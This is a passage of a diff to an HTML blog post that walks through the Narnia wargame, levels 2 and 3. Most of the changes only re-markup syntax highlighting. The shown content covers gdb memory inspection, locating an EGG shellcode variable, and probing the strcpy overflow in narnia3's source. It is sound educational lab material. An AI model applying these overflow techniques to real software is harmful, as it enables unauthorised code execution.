 &lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
@@ -452,7 +452,7 @@ narnia2
 &lt;div class="highlight"&gt;&lt;pre&gt;narnia2@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;gdb ./narnia2
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;set &lt;/span&gt;disassembly-flavor intel
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas main
-Dump of assembler code &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; main:
+Dump of assembler code &lt;span class="k"&gt;for function &lt;/span&gt;main:
    0x08048424 &amp;lt;+0&amp;gt;: push   ebp
    0x08048425 &amp;lt;+1&amp;gt;: mov    ebp,esp
    0x08048427 &amp;lt;+3&amp;gt;: and    esp,0xfffffff0
@@ -487,39 +487,39 @@ End of assembler dump.
 
 
 &lt;p&gt;We create a break point right before the exit:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;(gdb) b *main+97
-Breakpoint 1 at 0x8048485
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;
+&lt;span class="n"&gt;Breakpoint&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x8048485&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We run our program, feeding it with an argument of size 30 and we look to the memory (esp is the Stack pointer). The second value, &lt;strong&gt;0xffffd610&lt;/strong&gt;, indicates the start of the frame:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;(gdb) r `python -c &amp;#39;print &amp;quot;B&amp;quot;*30&amp;#39;`&lt;/span&gt;
-&lt;span class="x"&gt;(gdb)  x/30xw &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;esp&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
-&lt;span class="x"&gt;0xffffd600: 0x08048574  0xffffd610  0x00000001  0xf7ebf729&lt;/span&gt;
-&lt;span class="x"&gt;0xffffd610: 0x42424242  0x42424242  0x42424242  0x42424242&lt;/span&gt;
-&lt;span class="x"&gt;0xffffd620: 0x42424242  0x42424242  0x42424242  0xf7004242&lt;/span&gt;
-&lt;span class="x"&gt;0xffffd630: 0x08048258  0x00000000  0x00ca0000  0x00000001&lt;/span&gt;
-&lt;span class="x"&gt;0xffffd640: 0xffffd86d  0x0000002f  0xffffd69c  0xf7fcaff4&lt;/span&gt;
-&lt;span class="x"&gt;0xffffd650: 0x08048490  0x08049750  0x00000002  0x080482fd&lt;/span&gt;
-&lt;span class="x"&gt;0xffffd660: 0xf7fcb3e4  0x00008000  0x08049750  0x080484b1&lt;/span&gt;
-&lt;span class="x"&gt;0xffffd670: 0xffffffff  0xf7e59d46&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;B&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;`&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="n"&gt;xw&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd600&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x08048574&lt;/span&gt;  &lt;span class="mh"&gt;0xffffd610&lt;/span&gt;  &lt;span class="mh"&gt;0x00000001&lt;/span&gt;  &lt;span class="mh"&gt;0xf7ebf729&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd610&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd620&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0xf7004242&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd630&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x08048258&lt;/span&gt;  &lt;span class="mh"&gt;0x00000000&lt;/span&gt;  &lt;span class="mh"&gt;0x00ca0000&lt;/span&gt;  &lt;span class="mh"&gt;0x00000001&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd640&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0xffffd86d&lt;/span&gt;  &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;  &lt;span class="mh"&gt;0xffffd69c&lt;/span&gt;  &lt;span class="mh"&gt;0xf7fcaff4&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd650&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x08048490&lt;/span&gt;  &lt;span class="mh"&gt;0x08049750&lt;/span&gt;  &lt;span class="mh"&gt;0x00000002&lt;/span&gt;  &lt;span class="mh"&gt;0x080482fd&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd660&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0xf7fcb3e4&lt;/span&gt;  &lt;span class="mh"&gt;0x00008000&lt;/span&gt;  &lt;span class="mh"&gt;0x08049750&lt;/span&gt;  &lt;span class="mh"&gt;0x080484b1&lt;/span&gt;
+&lt;span class="mh"&gt;0xffffd670&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0xffffffff&lt;/span&gt;  &lt;span class="mh"&gt;0xf7e59d46&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now, looking  to the information about the frame, we get the return address at &lt;strong&gt;0xffffd69c&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;(gdb) i f
-Stack level 0, frame at 0xffffd6a0:
- eip = 0x8048485 in main; saved eip 0xf7e404b3
- Arglist at 0xffffd698, args:
- Locals at 0xffffd698, Previous frame&amp;#39;s sp is 0xffffd6a0
- Saved registers:
-  ebp at 0xffffd698, eip at 0xffffd69c
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;
+&lt;span class="n"&gt;Stack&lt;/span&gt; &lt;span class="n"&gt;level&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd6a0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+ &lt;span class="n"&gt;eip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x8048485&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;saved&lt;/span&gt; &lt;span class="n"&gt;eip&lt;/span&gt; &lt;span class="mh"&gt;0xf7e404b3&lt;/span&gt;
+ &lt;span class="n"&gt;Arglist&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd698&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+ &lt;span class="n"&gt;Locals&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd698&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Previous&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="n"&gt;sp&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="mh"&gt;0xffffd6a0&lt;/span&gt;
+ &lt;span class="n"&gt;Saved&lt;/span&gt; &lt;span class="n"&gt;registers&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+  &lt;span class="n"&gt;ebp&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd698&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;eip&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd69c&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To find the size of the frame we subtract these values:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;(gdb) p 0xffffd69c-0xffffd610
-$1 = 140
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="mh"&gt;0xffffd69c&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0xffffd610&lt;/span&gt;
+&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;140&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -531,7 +531,7 @@ $1 = 140
 
 
 &lt;p&gt;To find the address of &lt;strong&gt;EGG&lt;/strong&gt; we use the following &lt;strong&gt;C&lt;/strong&gt; code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nl"&gt;melinda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;getbashadd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;getbashadd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
 &lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
 &lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
 &lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
@@ -547,8 +547,8 @@ $1 = 140
 
 
 &lt;p&gt;Running it gives:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;narnia2@melinda:/tmp$ ./getshadd EGG /narnia/narnia2
-EGG will be at 0xffffd945
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;getshadd&lt;/span&gt; &lt;span class="n"&gt;EGG&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;
+&lt;span class="n"&gt;EGG&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="n"&gt;be&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd945&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -565,7 +565,7 @@ narnia3
 &lt;h3&gt;Step 1: Understanding the Problem&lt;/h3&gt;
 &lt;p&gt;The fourth level starts with:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;narnia3@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;./narnia3
-usage, ./narnia3 file, will send contents of file &lt;span class="m"&gt;2&lt;/span&gt; /dev/null
+usage, ./narnia3 file, will send contents of file 2 /dev/null
 narnia3@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;cat narnia3.c
 &lt;span class="c"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
 &lt;span class="c"&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
@@ -577,37 +577,37 @@ narnia3@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;cat narnia3.c
 
 int main&lt;span class="o"&gt;(&lt;/span&gt;int argc, char **argv&lt;span class="o"&gt;){&lt;/span&gt;
 
-        int  ifd,  ofd&lt;span class="p"&gt;;&lt;/span&gt;
-        char ofile&lt;span class="o"&gt;[&lt;/span&gt;16&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        char ifile&lt;span class="o"&gt;[&lt;/span&gt;32&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        char buf&lt;span class="o"&gt;[&lt;/span&gt;32&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        int  ifd,  ofd;
+        char ofile&lt;span class="o"&gt;[&lt;/span&gt;16&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;;
+        char ifile&lt;span class="o"&gt;[&lt;/span&gt;32&lt;span class="o"&gt;]&lt;/span&gt;;
+        char buf&lt;span class="o"&gt;[&lt;/span&gt;32&lt;span class="o"&gt;]&lt;/span&gt;;
 
         &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;argc !&lt;span class="o"&gt;=&lt;/span&gt; 2&lt;span class="o"&gt;){&lt;/span&gt;
-                &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;usage, %s file, will send contents of file 2 /dev/null\n&amp;quot;&lt;/span&gt;,argv&lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-                &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+                &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;usage, %s file, will send contents of file 2 /dev/null\n&amp;quot;&lt;/span&gt;,argv&lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;])&lt;/span&gt;;
+                &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
         &lt;span class="o"&gt;}&lt;/span&gt;
 
         /* open files */
-        strcpy&lt;span class="o"&gt;(&lt;/span&gt;ifile, argv&lt;span class="o"&gt;[&lt;/span&gt;1&lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;ofd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; open&lt;span class="o"&gt;(&lt;/span&gt;ofile,O_RDWR&lt;span class="o"&gt;))&lt;/span&gt; &amp;lt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;){&lt;/span&gt;
-                &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;error opening %s\n&amp;quot;&lt;/span&gt;, ofile&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-                &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        strcpy&lt;span class="o"&gt;(&lt;/span&gt;ifile, argv&lt;span class="o"&gt;[&lt;/span&gt;1&lt;span class="o"&gt;])&lt;/span&gt;;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;ofd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; open&lt;span class="o"&gt;(&lt;/span&gt;ofile,O_RDWR&lt;span class="o"&gt;))&lt;/span&gt; &amp;lt; 0 &lt;span class="o"&gt;){&lt;/span&gt;
+                &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;error opening %s\n&amp;quot;&lt;/span&gt;, ofile&lt;span class="o"&gt;)&lt;/span&gt;;
+                &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
         &lt;span class="o"&gt;}&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;ifd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; open&lt;span class="o"&gt;(&lt;/span&gt;ifile, O_RDONLY&lt;span class="o"&gt;))&lt;/span&gt; &amp;lt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;){&lt;/span&gt;
-                &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;error opening %s\n&amp;quot;&lt;/span&gt;, ifile&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-                &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;ifd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; open&lt;span class="o"&gt;(&lt;/span&gt;ifile, O_RDONLY&lt;span class="o"&gt;))&lt;/span&gt; &amp;lt; 0 &lt;span class="o"&gt;){&lt;/span&gt;
+                &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;error opening %s\n&amp;quot;&lt;/span&gt;, ifile&lt;span class="o"&gt;)&lt;/span&gt;;
+                &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
         &lt;span class="o"&gt;}&lt;/span&gt;
 
         /* copy from file1 to file2 */
-        &lt;span class="nb"&gt;read&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;ifd, buf, sizeof&lt;span class="o"&gt;(&lt;/span&gt;buf&lt;span class="o"&gt;)&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        write&lt;span class="o"&gt;(&lt;/span&gt;ofd,buf, sizeof&lt;span class="o"&gt;(&lt;/span&gt;buf&lt;span class="o"&gt;)&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;copied contents of %s to a safer place... (%s)\n&amp;quot;&lt;/span&gt;,ifile,ofile&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="nb"&gt;read&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;ifd, buf, sizeof&lt;span class="o"&gt;(&lt;/span&gt;buf&lt;span class="o"&gt;)&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
+        write&lt;span class="o"&gt;(&lt;/span&gt;ofd,buf, sizeof&lt;span class="o"&gt;(&lt;/span&gt;buf&lt;span class="o"&gt;)&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;;
+        &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;copied contents of %s to a safer place... (%s)\n&amp;quot;&lt;/span&gt;,ifile,ofile&lt;span class="o"&gt;)&lt;/span&gt;;
 
         /* close &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;em */
-        close&lt;span class="o"&gt;(&lt;/span&gt;ifd&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        close&lt;span class="o"&gt;(&lt;/span&gt;ofd&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        close&lt;span class="o"&gt;(&lt;/span&gt;ifd&lt;span class="o"&gt;)&lt;/span&gt;;
+        close&lt;span class="o"&gt;(&lt;/span&gt;ofd&lt;span class="o"&gt;)&lt;/span&gt;;
 
-        &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;;
 &lt;span class="o"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -621,26 +621,26 @@ int main&lt;span class="o"&gt;(&lt;/span&gt;int argc, char **argv&lt;span class=
 
 &lt;h3&gt;Step 2: Understanding what is going on in the Memory&lt;/h3&gt;
 &lt;p&gt;Let's debug this binary to see how we can exploit it. First with a simple 3-bytes input:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;(gdb) set args &amp;quot;`python -c &amp;#39;print &amp;quot;a&amp;quot;*3&amp;#39;`&amp;quot;
-(gdb) r
-Starting program: /games/narnia/narnia3 &amp;quot;`python -c &amp;#39;print &amp;quot;a&amp;quot;*3&amp;#39;`&amp;quot;
-error opening aaa
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*3&amp;#39;`&amp;quot;&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;
+&lt;span class="n"&gt;Starting&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia3&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*3&amp;#39;`&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="n"&gt;opening&lt;/span&gt; &lt;span class="n"&gt;aaa&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;OK, it makes sense, there is no such file. Now let's try the size of &lt;em&gt;ifile&lt;/em&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;(gdb) set args &amp;quot;`python -c &amp;#39;print &amp;quot;a&amp;quot;*32&amp;#39;`&amp;quot;
-(gdb) r
-Starting program: /games/narnia/narnia3 &amp;quot;`python -c &amp;#39;print &amp;quot;a&amp;quot;*32&amp;#39;`&amp;quot;
-error opening
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*32&amp;#39;`&amp;quot;&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;
+&lt;span class="n"&gt;Starting&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia3&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*32&amp;#39;`&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="n"&gt;opening&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Mmm, interesting. It does not input any name. Let's try one byte less:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;(gdb) set args &amp;quot;`python -c &amp;#39;print &amp;quot;a&amp;quot;*31&amp;#39;`&amp;quot;
-(gdb) r
-Starting program: /games/narnia/narnia3 &amp;quot;`python -c &amp;#39;print &amp;quot;a&amp;quot;*31&amp;#39;`&amp;quot;
-error opening aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
